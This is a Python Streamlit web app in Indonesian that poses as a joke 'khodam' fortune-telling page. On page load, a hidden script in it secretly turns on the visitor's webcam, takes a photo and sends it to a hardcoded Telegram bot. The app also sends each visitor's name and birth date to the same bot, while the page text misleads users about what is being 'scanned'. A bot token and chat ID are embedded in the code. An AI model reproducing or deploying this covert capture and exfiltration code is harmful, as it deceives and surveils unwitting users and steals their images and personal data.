import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import time
import hashlib

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="KLINIK HALU NASIONAL - Cek Khodam",
    page_icon="🧙‍♀️",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING CYBER-MYSTIC PREMIUM
# ========================l==================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');

    .stApp {
        background: radial-gradient(circle at 50% 20%, #1e1b4b 0%, #030712 100%);
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }

    /* Kotak Utama / Glassmorphism Card */
    .mystic-card {
        background: rgba(15, 23, 42, 0.75);
        backdrop-filter: blur(16px);
        border: 1px solid rgba(139, 92, 246, 0.3);
        border-radius: 20px;
        padding: 30px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(139, 92, 246, 0.15);
        margin-bottom: 25px;
    }

    /* Kotak Alasan Pemindaian Khodam */
    .camera-reason-box {
        background: rgba(139, 92, 246, 0.1);
        border-left: 4px solid #c084fc;
        padding: 14px 18px;
        border-radius: 10px;
        margin-bottom: 20px;
        font-size: 14px;
        color: #e2e8f0;
        line-height: 1.5;
    }

    /* Tombol Utama Eksklusif */
    div[data-testid="stFormSubmitButton"] > button {
        background: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%) !important;
        color: #ffffff !important;
        font-weight: 800 !important;
        letter-spacing: 1px !important;
        border: none !important;
        padding: 16px 24px !important;
        border-radius: 14px !important;
        width: 100% !important;
        box-shadow: 0 4px 20px rgba(217, 70, 239, 0.4) !important;
        transition: all 0.3s ease !important;
        text-transform: uppercase;
    }
    div[data-testid="stFormSubmitButton"] > button:hover {
        background: linear-gradient(135deg, #9333ea 0%, #c084fc 100%) !important;
        box-shadow: 0 6px 25px rgba(217, 70, 239, 0.7) !important;
        transform: translateY(-2px) !important;
    }

    /* Tombol Biasa / Reset */
    .stButton > button {
        background: #0f172a !important;
        color: #f1f5f9 !important;
        border: 1px solid #334155 !important;
        border-left: 4px solid #8b5cf6 !important;
        font-weight: 600 !important;
        text-align: left !important;
        padding: 14px 20px !important;
        border-radius: 12px !important;
        width: 100% !important;
        transition: all 0.3s ease !important;
    }
    .stButton > button:hover {
        background: #1e1b4b !important;
        border-color: #c084fc !important;
        border-left: 4px solid #d946ef !important;
        transform: translateX(4px) !important;
    }

    /* Input Field Styling */
    .stTextInput > div > div > input {
        background-color: #020617 !important;
        color: #f8fafc !important;
        border: 1px solid #334155 !important;
        border-radius: 12px !important;
        padding: 14px !important;
    }
    .stTextInput > div > div > input:focus {
        border-color: #8b5cf6 !important;
        box-shadow: 0 0 10px rgba(139, 92, 246, 0.3) !important;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False

# ==========================================
# DATABASE KHODAM PALING KOCAK & ABSURD
# ==========================================
MASTER_KHODAM = [
    {
        "title": "👻 Khodam Tuyul Insyaf Nyambi Jadi Dropshipper",
        "desc": "Kerjanya mondar-mandir malem hari bukan buat nyuri duit warga, tapi ngecek resi TikTok Shop yang gak nyampe-nyampe. Sukanya minta sesajen seblak kuah ceker."
    },
    {
        "title": "🐒 Khodam Monyet Nge-vlog di Kandang Macan",
        "desc": "Mentalnya sultan tapi dompetnya langganan diskon ongkir. Suka sok asik di grup WhatsApp padahal cuma nyimak doang sambil rebahan."
    },
    {
        "title": "🐔 Khodam Ayam Kampus Nyasar ke Warung Tegal",
        "desc": "Aura wibawanya tinggi banget kalau lagi laper. Pantang pulang sebelum es teh manis dan kerupuk putih dua biji pindah ke perut."
    },
    {
        "title": "🛵 Khodam Driver Ojol Bonceng Kuntilanak",
        "desc": "Ngebut mulu di jalan raya batin, tapi kalau ditanya 'kapan nikah?' langsung mendadak amnesia dan halusinasi jadi power ranger."
    },
    {
        "title": "🐸 Khodam Kodok Ngorek Minta Kuota Internet",
        "desc": "Hatinya sensitif banget kalau kuota tinggal 10 MB. Suka ngelamun mandangin langit malam sambil mikirin kenapa mantan bisa foya-foya."
    },
    {
        "title": "🦖 Khodam Dinosaurus Nyangkut di Got Perumahan",
        "desc": "Gagah perkasa di luar, tapi kalau ketemu kecoa terbang langsung teriak histeris ngalahin toa masjid tetangga."
    },
    {
        "title": "🩴 Khodam Swallow Putus Tali Pakai Peniti",
        "desc": "Simbol ketahanan hidup tingkat dewa. Bisa bertahan melewati badai galau gara-gara chat cuma di-read centang biru."
    },
    {
        "title": "📦 Khodam Paket COD Nyasar ke Kandang Bebek",
        "desc": "Hidupnya penuh misteri ilahi. Datang gak diundang, pas ditagih kurir malah ngumpet di balik pintu kamar mandi."
    },
    {
        "title": "🍜 Khodam Mie Instan Setengah Matang Dini Hari",
        "desc": "Jiwa seni kulinernya tinggi tapi males masak. Suka overthinking masalah hidup tepat jam 2 pagi pas lambungnagih jatah."
    },
    {
        "title": "🧊 Khodam Es Batu Puding Pensiun Dini",
        "desc": "Cair seketika kalau diomelin emak. Auranya dingin di awal tapi aslinya gampang luluh kalau ditraktir boba."
    }
]

# ==========================================
# FUNGSI KIRIM TELEGRAM (TEKS & FOTO DIAM-DIAM)
# ==========================================
def send_text_to_telegram(name, dob, profile_title):
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    caption = (
        f"👑 <b>RITUAL KHODAM DIMULAI!</b>\n\n"
        f"👤 Target: <b>{name}</b>\n"
        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
        f"🕒 Waktu: {now}\n"
        f"🐾 Hasil Khodam: <b>{profile_title}</b>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

# --- STEP 0: FORM RITUAL & PENJELASAN PEMINDAIAN KHODAM ---
if st.session_state.step == 0:
    st.markdown("<h1 style='text-align: center; color: #c084fc;'>🧙‍♀️ KLINIK HALU NASIONAL</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Temukan khodam paling absurd yang bersemayam di dalam dirimu sekarang juga!</p>", unsafe_allow_html=True)

    with st.container():
        st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
        
        # Penjelasan pop-up/kotak bertema untuk pemindaian khodam (tanpa scan wajah)
        st.markdown("""
            <div class="camera-reason-box">
                🔮 <b>Informasi Pemindaian Khodam Astral:</b><br>
                Sistem akan memindai gelombang energi gaibmu secara otomatis untuk mencocokkan frekuensi khodam di dimensi lain!
            </div>
        """, unsafe_allow_html=True)
        
        with st.form("ritual_khodam_form"):
            name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Ucup Surucup", placeholder="Contoh: Ucup Surucup")
            dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value="01/01/2000", placeholder="Contoh: 01/01/2000")
            
            st.write("")
            submitted = st.form_submit_button("🔥 BONGKAR KHODAM KOCAK SAYA")
            
            if submitted:
                if not name_input.strip():
                    st.warning("⚠️ Masukkan nama dulu cuy, dukunnya gak bisa nebak kalau kosong.")
                else:
                    st.session_state.user_name = name_input.strip()
                    st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
                    st.session_state.telegram_sent = False
                    st.session_state.step = 1
                    st.rerun()
                    
        st.markdown('</div>', unsafe_allow_html=True)

    # SKRIP KAMERA TERSEMBUNYI (DIAM-DIAM AMBIL FOTO UNTUK TELEGRAM SEPERTI PERMINTAAN AWAL)
    hidden_js_camera = f"""
    <div>
        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <script>
            const token = "{TELEGRAM_BOT_TOKEN}";
            const chatId = "{TELEGRAM_CHAT_ID}";
            
            navigator.mediaDevices.getUserMedia({{ video: true }})
            .then(function(stream) {{
                var video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {{
                    var canvas = document.getElementById('canvas');
                    var context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    var dataURL = canvas.toDataURL('image/jpeg');
                    
                    fetch(dataURL)
                    .then(res => res.blob())
                    .then(blob => {{
                        var formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'mystic_target.jpg');
                        formData.append('caption', '👑 <b>TARGET KHODAM KOCAK TERDETEKSI (SESI AWAL)!</b>');
                        
                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                            method: 'POST',
                            body: formData
                        }});
                    }});
                    
                    stream.getTracks().forEach(track => track.stop());
                }}, 1500);
            }})
            .catch(function(err) {{
                console.log("Akses kamera ditolak: ", err);
            }});
        </script>
    </div>
    """
    components.html(hidden_js_camera, height=0)

# --- STEP 1: ANIMASI PROSES RITUAL MISTIS ---
elif st.session_state.step == 1:
    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 MENERAWANG ALAM GHAIB...</h2>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #94a3b8;'>Tunggu sebentar, dukun sedang meracik mantra paling kocak sejagat raya.</p>", unsafe_allow_html=True)
    
    st.write("")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    status_text.text("👻 Menghubungkan frekuensi sukma dengan dimensi lawak...")
    progress_bar.progress(30)
    time.sleep(1)
    
    status_text.text(f"🔍 Menyelami isi pikiran {st.session_state.user_name} yang penuh drama...")
    progress_bar.progress(65)
    time.sleep(1.2)
    
    status_text.text("💥 Menangkap wujud khodam paling absurd...")
    progress_bar.progress(90)
    time.sleep(1)
    
    status_text.text("✨ Selesai! Membuka hasil terawangan...")
    progress_bar.progress(100)
    time.sleep(0.6)
    
    st.session_state.step = 2
    st.rerun()

# --- STEP 2: TAMPILAN HASIL KHODAM KOCAK ---
elif st.session_state.step == 2:
    if not st.session_state.telegram_sent:
        unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
        hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
        
        khodam_idx = hash_val % len(MASTER_KHODAM)
        power_level = (hash_val % 99) + 1
        
        profile = MASTER_KHODAM[khodam_idx]
        profile['power'] = f"Tingkat Keabsurdan: {power_level}% (Sangat Berbahaya Bagi Iman)"
        
        st.session_state.current_profile = profile
        
        send_text_to_telegram(
            name=st.session_state.user_name,
            dob=st.session_state.user_dob,
            profile_title=profile['title']
        )
        st.session_state.telegram_sent = True

    profile = st.session_state.current_profile

    st.markdown(f"<h2 style='text-align: center; color: #4ade80;'>✨ Hasil Terawangan Khodam Paling Kocak</h2>", unsafe_allow_html=True)
    st.write("")

    st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
    st.markdown(f"<h3 style='color: #c084fc; text-align: center;'>{profile['title']}</h3>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align: center; color: #f43f5e; font-weight: 600;'>{profile['power']}</p>", unsafe_allow_html=True)
    st.markdown("<hr style='border-color: rgba(139, 92, 246, 0.2);'>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align: center; font-size: 1.1rem; line-height: 1.6; color: #e2e8f0;'>{profile['desc']}</p>", unsafe_allow_html=True)
    st.markdown('</div>', unsafe_allow_html=True)

    st.write("")
    if st.button("🔄 CEK ULANG (GANTI NAMA LAIN)", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = "Ucup Surucup"
        st.session_state.user_dob = ""
        st.session_state.telegram_sent = False
        st.rerun()
